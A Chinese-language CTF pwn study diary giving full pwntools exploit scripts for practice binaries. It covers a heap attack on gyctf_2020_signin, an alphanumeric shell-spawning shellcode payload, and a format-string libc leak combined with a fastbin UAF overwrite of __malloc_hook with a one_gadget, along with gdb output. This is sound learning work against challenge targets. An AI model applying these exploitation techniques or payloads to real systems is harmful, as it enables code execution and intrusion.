
```python
from pwn import *
context.log_level='debug'
r=process('gyctf_2020_signin')
#r=remote('node4.buuoj.cn',28866)
def add(index):
    r.recvuntil("your choice?")
    r.sendline('1')
    r.recvuntil("idx?\n")
    r.sendline(str(index))
def delete(index):
    r.recvuntil("your choice?")
    r.sendline('3')
    r.recvuntil("idx?\n")
    r.sendline(str(index))
ptr = 0x4040C0
def edit(index, content):
    r.recvuntil("your choice?")
    r.sendline('2')
    r.recvuntil("idx?\n")
    r.sendline(str(index))
    r.send(content)
for i in range(8):
    add(i)
for i in range(8):
    delete(i)
payload=p64(ptr-0x18)
edit(7,payload)
add(8)
r.sendline(str(6))
r.interactive()
```

## 3.mrctf2020_shellcode_revenge

可见字符的shellcode 推荐ae64和阿尔法3 然后记得装个py3.7不然没法用这些工具的

```python
from pwn import *
r=process('mrctf2020_shellcode_revenge')
context.log_level='debug'
r=remote('node4.buuoj.cn',29572)
r.recv()
payload='WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP'
r.send(payload)
r.interactive()
```

# 7.25

## 1.gyctf_2020_some_thing_interesting（格式化字符串+UAF）

a1是可控的我们可以由此泄露出libc的地址，然后在dele处有UAF漏洞，所以我们可以用fastbin attack

```c
unsigned __int64 __fastcall bug1(const char *a1){
  unsigned __int64 v2;
// [rsp+18h] [rbp-8h]
  v2 = __readfsqword(0x28u);
  if ( dword_202010 )  {
    puts("Now you are ....?");
    printf("# Your Code is ");
    printf(a1);
    putchar(10);
    puts("###############################################################################");
  }
  else  {
    puts("Now you are Administrator!");
  }
return __readfsqword(0x28u) ^ v2;
}
```

泄露libc，先随便输入个偏移%12$p

```text
Starting program:
 /home/q/Desktop/gyctf_2020_some_thing_interesting
########################       Surprise      ##---------------------#> Input your code please:OreOOrereOOreO%12$p#---------------------##      ALL Down!      ################################################      Action menu    ##---------------------##    0.Check  Code.   ##    1.Create Oreo.   ##    2.Modify Oreo.   ##    3.Delete Oreo.   ##    4.View   Oreo.   ##    5.Exit   system. ########################> Now please tell me what you want to do :0Now you are ....?# Your Code is OreOOrereOOreO0x555555555680
```

下面我去看看OreOOrereOOreO%12$p这个字符串的地址

用search发现他在0x555555756050因为这个data段不在栈上面，我们就一个个的试发现偏移是7 这个是基础偏移

下面找到在数据在栈上是哪里去指向与他的（找的时候范围扩大点）

第一次出现在0x7fffffffddc8 下面有__libc_start_main+240可以泄露 0x7fffffffde18-0x7fffffffddc8 然后除以8得到泄露偏移

```text
fb:07d8│ 0x7fffffffddc0 —▸ 0x5555555549e0 ◂— xor    ebp, ebp
fc:07e0│ 0x7fffffffddc8 —▸ 0x555555756050 ◂— 'OreOOrereOOreO%7$p\n'
fd:07e8│ 0x7fffffffddd0 ◂— 0x1fe
:07f0│ 0x7fffffffddd8 ◂— 0x172557002dac300ff
:07f8│ 0x7fffffffdde0 ◂— 0x0100
:0800│ 0x7fffffffdde8 —▸ 0x5555555555e3 ◂— mov    eax, dword ptr [rbp - 0x14]
101:0808│ 0x7fffffffddf0 —▸ 0x555555555680 ◂— push   r15
102:0810│ 0x7fffffffddf8 ◂— 0x555549e0
103:0818│ 0x7fffffffde00 —▸ 0x555555756050 ◂— 'OreOOrereOOreO%7$p\n'
104:0820│ 0x7fffffffde08 ◂— 0x172557002dac3001
05:0828│ 0x7fffffffde10 —▸ 0x555555555680 ◂— push   r15
106:0830│ 0x7fffffffde18 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
```

基础偏移加泄露偏移=真实地址存放偏移 %17$p

fastbin攻击，利用uaf去修改fd的指针，去进行一个任意写，一般这个地址在__malloc_hook-0x23

我们可以看下是什么东西

```text
pwndbg> p &__malloc_hook
$2 = (void *(* **)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>
pwndbg> x/32gx 0x7ffff7dd1b10-0x23
0x7ffff7dd1aed <_IO_wide_data_0+301>:
0xfff7dd0260000000    0x00000000000000
```

```text
p _IO_wide_data_0
$3 = {  _IO_read_ptr = 0x0,   _IO_read_end = 0x0,   _IO_read_base = 0x0,   _IO_write_base = 0x0,   _IO_write_ptr = 0x0,   _IO_write_end = 0x0,   _IO_buf_base = 0x0,   _IO_buf_end = 0x0,   _IO_save_base = 0x0,   _IO_backup_base = 0x0,   _IO_save_end = 0x0,   _IO_state = {    __count = 0,     __value = {      __wch = 0,       __wchb = "\000\000\000"    }  },
```

里面的代码个人理解就是进行一个任意写入的操作去绕过检测，不然直接更改malloc_hook的指向是会报错的哦

所以我们去uaf后edit的那个chunk是写入malloc_hook-0x23

add回来的时候我们再去写内容就是往这个地址里面去写内容，所以呢，我们还得去看下这里面的指针是怎么排布的

```text
pwndbg> x/32gx 0x7ffa4f391aed
0x7ffa4f391aed <_IO_wide_data_0+301>:
0xfa4f390260000000    0x000000000000007f
```

这里的0x10大小是必须填满的，接着我们要填充到__memalign_hook

在GNU系统中，malloc或realloc返回的内存块地址都是`8`的倍数（如果是`64`位系统，则为`16`的倍数）。如果你需要更大的粒度，使用memalign。这些函数在头文件“stdlib.h”中声明。     在GNU库中，可以使用函数free释放memalign返回的内存块。     函数：void * memalign (size_t boundary, size_t size)      函数memalign将分配一个由size指定大小，地址是boundary的倍数的内存块。参数boundary必须是`2`的幂！函数memalign可以分配较大的内存块，并且可以为返回的地址指定粒度。

用这个钩子去触发__malloc_hook,所以我们要看malloc_hook-0x23距离这个

__memalign_hook这个钩子有多远你填充多少个字节的junk code

这个程序的是距离0x13，所以add回来的时候先用0x13压入再传入onegadget 下次再add的时候就是执行onegadget了

exp

```python
from pwn import *
#r=remote("node4.buuoj.cn",29754)
r=process('./gyctf_2020_some_thing_interesting')
elf=('./gyctf_2020_some_thing_interesting')
#libc=ELF('libc-2.23.so')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'
#one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget_16= [0x45226,0x4527a,0xf03a4,0xf1247]
def add(size1, content1, size2, content2):
    r.recvuntil("#######################\n")
    r.sendline('1')
    r.recvuntil("> O's length : ")
    r.sendline(str(size1))
    r.recvuntil("> O : ")
    r.send(content1)
    r.recvuntil("> RE's length : ")
    r.sendline(str(size2))
    r.recvuntil("> RE : ")
    r.send(content2)
def delete(index):
    r.recvuntil("#######################\n")
    r.sendline('3')
    r.recvuntil("> Oreo ID : ")
    r.sendline(str(index))
def show(index):
    r.recvuntil("#######################\n")
    r.sendline('4')
    r.recvuntil("> Oreo ID : ")
    r.sendline(str(index))
def edit(index, content1, content2):
    r.recvuntil("#######################\n")
    r.sendline('2')
    r.recvuntil("> Oreo ID : ")
    r.sendline(str(index))
    r.recvuntil("> O : ")
    r.sendline(content1)
    r.recvuntil("> RE : ")
    r.sendline(content2)
r.recvuntil("> Input your code please:")
r.sendline("OreOOrereOOreO%17$p")
    #elf 11 libc 17
r.recvuntil("#######################\n")
r.sendline('0')
r.recvuntil("# Your Code is ")
r.recvuntil('0x')
start_main = int(r.recv(12), 16) - 0xf0
libc.address = start_main - libc.sym['__libc_start_main']
malloc_hook = libc.sym['__malloc_hook']
one_gadget = one_gadget_16[3] + libc.address
#realloc=libc.address+libc.sym['__realloc_hook']
success("start+main"+hex(start_main))
success("libc_base:"+hex(libc.address))
add(0x68, 'aaaa', 0x68, 'bbbb')
delete(1)
edit(1,'\x00'*8,p64(malloc_hook-0x23))
gdb.attach(r)
payload='a'*(0x13)+p64(one_gadget)
add(0x68,'a'*16,0x68,payload)
gdb.attach(r)
r.recvuntil("#######################\n")
r.sendline('1')
r.recvuntil("> O's length : ")
r.sendline(str(0x68))
r.interactive()
```

# 7月27日

## 1.xman_2019_format（堆上的格式化利用）

```c
int sub_8048651(){
  void *buf;
// [esp+Ch] [ebp-Ch]
  puts("...");
  buf = malloc(0x100u);
  read(0, buf, 0x37u);
  return sub_804862A((char *)buf);
}
```
